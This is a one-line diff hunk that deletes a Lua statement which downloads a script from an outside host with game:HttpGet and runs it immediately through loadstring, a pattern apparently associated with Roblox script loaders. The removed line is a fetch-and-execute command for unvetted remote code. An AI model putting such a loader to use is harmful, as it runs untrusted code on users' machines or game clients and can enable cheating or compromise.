@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://runs.gg/main/loader.lua"))()
